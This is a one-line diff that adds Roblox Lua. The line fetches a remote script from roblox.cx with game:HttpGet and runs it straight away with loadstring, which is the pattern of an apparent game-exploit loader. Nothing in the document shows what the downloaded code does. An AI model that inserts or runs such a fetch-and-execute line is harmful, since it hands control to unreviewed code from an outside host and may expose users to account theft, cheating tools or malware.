@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://roblox.cx/bp2s/loader.lua', true))();
